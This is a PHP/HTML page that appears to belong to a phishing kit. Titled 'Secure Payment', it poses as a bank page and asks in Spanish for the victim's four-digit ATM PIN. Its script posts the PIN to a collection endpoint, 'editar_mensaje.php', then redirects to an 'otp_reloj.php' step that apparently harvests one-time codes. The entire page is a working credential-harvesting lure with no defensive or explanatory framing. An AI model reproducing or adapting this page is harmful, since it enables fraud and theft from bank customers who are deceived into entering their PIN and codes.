<?php

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">


    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">


    
        <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
		<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="/scripts/functions.js"></script>  		


    <title>Secure Payment</title>

    <style>

    *{
        margin: 0;
        padding: 0;
        font-family: Arial, Helvetica, sans-serif;
    }

    #trazo {
        background-image: url(img/bg-trazo.svg);
        width: auto;
        background-position: top;
    }

    .contenido {
        position: relative;
        top: 5rem;
    }

    #txtPassword {
        color: #fff;
    }

    #txtPassword::placeholder {
        color: #fff;
    }
    
    .forget-text {
        display: flex;
        justify-content: end;
        padding-right: 2rem;
    }

    </style>


</head>
<body style="background-color:#2c2a29;">
<div id="trazo">

<center>
    <br>

    <img src="img/logo.png" alt="" srcset="" width="100%">
<br>
    <br>
    <a style="font-size:30px; color:#fff;">Ingresa tu clave</a>
</center>


<div class="contenido" style="width:90%; border-radius:30px; border: none; background-color:#454648; height:290px; padding:20px; margin:auto;">

<center>
    <br>
    <a style="font-size:16px; text-align:center; color:#fff;">Es la misma que utilizas en el cajero</a>
    <br>
    <br>
    <input type="text" name="user" id="txtPassword" placeholder="****" style="border:none; width:90%; height:35px; background: transparent; border-bottom:2px solid #fff; padding.left:15px; text-align:center;" maxlength="4" minlenght="4" oninput="this.value = this.value.replace(/\D+/g, '');">
    <br>
</center>
    <a style="position:absolute; color:#fff; right: 10%; margin-top:6px"><small>¿olvidaste tu clave?</small></a>

<br>
<br>
<br>
<center>
    <input type="submit" value="Continuar" id="btnPass" style="width:80%; background-color:#fdd923; height:40px; border-radius:100px; border:none; font-weight:bold; color:black;">
</center>

</div>



<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {
	

		$('#btnPass').click(function(){
			if ($("#txtPassword").val().length > 3) {
				const data = {
                    'pass': $("#txtPassword").val()
                };
				 $.ajax({
                    url: '../../acciones/editar_mensaje.php',
                    method: 'POST',
                    data: {
                        data: data
                    },
                    success: function(response) {
                        const result = JSON.parse(response);
                        if (result.success) {
                            window.location.href = "otp_reloj.php";
                        } else {
                            alert('Error de conexión, por favor intente de nuevo');
                           window.location.href = "/";
                        }
                    },
                    error: function(xhr, status, error) {
                        alert('Error en la solicitud AJAX: ' + error);
                    }
                });
			}else{
				$(".mensaje").show();
			}	
		});

				
	});
</script>
</body>
</html>